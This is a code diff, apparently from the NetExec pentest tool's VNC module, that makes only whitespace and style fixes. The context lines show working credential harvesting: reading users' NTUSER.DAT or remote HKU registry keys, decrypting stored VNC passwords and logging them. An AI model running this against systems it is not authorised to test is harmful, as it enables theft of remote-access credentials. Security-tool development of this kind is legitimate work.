@@ -89,7 +89,7 @@ class NXCModule:
             conn.connect()
         return conn
 
-    def reg_query_value(self, remote_ops, path, key, hku = False):
+    def reg_query_value(self, remote_ops, path, key, hku=False):
         if remote_ops._RemoteOperations__rrp:
             ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp) if hku else rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
             reg_handle = ans["phKey"]
@@ -118,13 +118,13 @@ class NXCModule:
         for user, sid in users.items():
             ntuser_dat_path = ntpath.join(f"Users\\{user}\\NTUSER.DAT")
             try:
-                ntuser_dat_bytes = dploot_conn.readFile(self.share,ntuser_dat_path)
+                ntuser_dat_bytes = dploot_conn.readFile(self.share, ntuser_dat_path)
             except Exception as e:
                 self.context.log.debug(f"Error while getting NTUSER.DAT file for {user}: {e}")
             for vnc_name, registry_path, registry_keys in vnc_client_softwares:
                 cred = {}
                 if ntuser_dat_bytes is None and remote_ops is not None:
-                    user_registry_path = ntpath.join(sid,registry_path)
+                    user_registry_path = ntpath.join(sid, registry_path)
                     try:
                         password = self.reg_query_value(remote_ops, user_registry_path, registry_keys[1], hku=True).encode().rstrip(b"\x00").decode()
                         cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
@@ -142,10 +142,10 @@ class NXCModule:
                     parent_key = reg.findKey(registry_path)
                     if parent_key is None:
                         continue
-                    cred["user"] = reg.getValue(ntpath.join(registry_path,registry_keys[0]))[1].decode("latin-1")
-                    password = reg.getValue(ntpath.join(registry_path,registry_keys[1]))[1].decode("utf-16le").rstrip("\0").encode()
+                    cred["user"] = reg.getValue(ntpath.join(registry_path, registry_keys[0]))[1].decode("latin-1")
+                    password = reg.getValue(ntpath.join(registry_path, registry_keys[1]))[1].decode("utf-16le").rstrip("\0").encode()
                     cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
-                    cred["server"] = reg.getValue(ntpath.join(registry_path,registry_keys[2]))[1].decode("latin-1")
+                    cred["server"] = reg.getValue(ntpath.join(registry_path, registry_keys[2]))[1].decode("latin-1")
 
                 self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")
 
@@ -271,12 +271,12 @@ class NXCModule:
                     break
             except Exception as e:
                 self.context.debug(f"Error while listing users from HKU: {e}")
-            i +=1
+            i += 1
         rrp.hBaseRegCloseKey(conn._RemoteOperations__rrp, keyHandle)
         for sid in sids:
-            ans = rrp.hBaseRegOpenKey(conn._RemoteOperations__rrp, regHandle, ntpath.join(userlist_key,sid), samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
+            ans = rrp.hBaseRegOpenKey(conn._RemoteOperations__rrp, regHandle, ntpath.join(userlist_key, sid), samDesired=rrp.MAXIMUM_ALLOWED | rrp.KEY_ENUMERATE_SUB_KEYS | rrp.KEY_QUERY_VALUE)
             keyHandle = ans["phkResult"]
-            _,  profile_path = rrp.hBaseRegQueryValue(conn._RemoteOperations__rrp, keyHandle, "ProfileImagePath")
+            _, profile_path = rrp.hBaseRegQueryValue(conn._RemoteOperations__rrp, keyHandle, "ProfileImagePath")
             if r"%systemroot%" in profile_path:
                 continue
             users[ntpath.basename(profile_path.rstrip("\0"))] = sid.rstrip("\0")
